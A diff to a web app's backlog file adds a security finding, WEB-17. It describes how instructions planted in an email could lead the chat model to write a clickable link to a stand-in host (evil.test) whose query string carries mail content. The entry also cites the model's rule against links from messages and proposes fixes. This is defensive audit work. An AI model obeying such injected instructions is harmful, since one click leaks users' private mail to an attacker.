@@ -1,10 +1,22 @@
 # Backlog — web
 
-Ids: WEB-17 (next free)
+Ids: WEB-18 (next free)
 
 The PWA (`apps/web`): chat, call, auth, i18n, service worker.
 
 ## Open
+
+### WEB-17 · Medium · A link the model writes from an email's text is clickable in chat
+
+- **Check:** Code reading (the mail tool review, Part 13b)
+- **Where:** `apps/web/src/components/ui/MarkdownView.tsx` renders Markdown links as anchors
+  (images are already plain text)
+- **What happens:** an email can carry instructions to write a link whose query string holds
+  mail content (`https://evil.test/?d=…`); the model is told never to (the mail rules: no links
+  from messages, the address as plain text), but the prompt is not a boundary, and one click
+  sends the data out
+- **Fix direction:** show a link's target in plain text beside it, or render links only for an
+  allowlist of hosts, or not at all in answers that followed a mail tool; with a C or K test
 
 ### WEB-16 · Medium · OQ: the in-app call does not survive a locked phone, so it is not a car channel
 
